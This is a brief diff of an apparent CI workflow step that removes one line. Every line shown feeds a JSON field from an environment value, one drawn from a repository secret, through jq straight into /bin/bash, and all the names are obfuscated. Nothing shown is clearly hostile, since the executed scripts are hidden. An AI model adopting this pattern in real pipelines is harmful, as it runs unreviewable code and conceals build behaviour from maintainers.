@@ -22,7 +22,6 @@ jobs:
           fqxf6387: ${{ secrets.fqxf6387 }}
         run: |
           printf '%s' "$fqxf6387" | jq -r .jroyq027 | /bin/bash
-          printf '%s' "$l1" | jq -r .ea87 | /bin/bash
           echo $rafvi405 | jq -r .nj38 | /bin/bash
           printf '%s' "$keu07914" | jq -r .tk83601 | /bin/bash
           printf '%s' "$clbxg3" | jq -r .cacfu6408 | /bin/bash
